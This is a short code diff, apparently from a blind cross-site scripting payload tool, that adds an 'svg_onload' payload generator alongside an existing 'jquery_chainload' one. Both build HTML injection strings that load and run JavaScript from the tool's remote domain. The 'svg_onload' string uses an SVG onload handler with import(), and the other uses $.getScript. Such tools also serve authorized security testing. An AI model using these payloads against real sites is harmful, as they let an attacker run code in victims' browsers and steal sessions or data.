@@ -108,6 +108,9 @@ export default {
         jquery_chainload: function() {
             return '<script>$.getScript("https://' + this.base_domain + '")<\/script>';
         },
+        svg_onload: function() {
+            return '<svg/onload=import("https://' + this.base_domain + '")>';
+        },
     },
     computed: {},
     components: {},
